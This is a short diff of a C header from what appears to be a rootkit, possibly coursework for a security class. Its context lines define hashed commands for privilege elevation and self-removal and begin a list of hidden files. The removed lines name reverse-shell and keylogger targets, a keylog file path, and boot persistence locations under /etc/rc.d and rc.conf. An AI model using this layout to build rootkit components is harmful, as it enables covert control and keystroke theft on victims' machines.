@@ -32,18 +32,6 @@
 #define RKCALL_ELEVATE "7c2e28607149c89ec12ede558f021a1428bbe80342249c3febcb15efa6e8e65a"
 #define RKCALL_DIE "41580f3e3b18a4dadf03d128b9fa9ab80a5b6ac088ee5f713559fa7ba59c5a6d"
 
-
-RSHELL="rshell_target"
-RSHELL_CONF_FILE="rshell"
-KEYLOG="keylog_target"
-KEYLOG_CONF_FILE="keylog"
-KEYLOG_LOG_FILE="/usr/home/comp6447/keylog_file"
-
-RC_INSTALL_LOCATION="/etc/rc.d/"
-RC_CONF_FILE="/etc/rc.conf"
-USR_SBIN="/usr/sbin/"
-
-
 /* Hidden files. */
 #define NUM_HIDDEN_FILES 7
 static const char *hidden_files[NUM_HIDDEN_FILES] = {
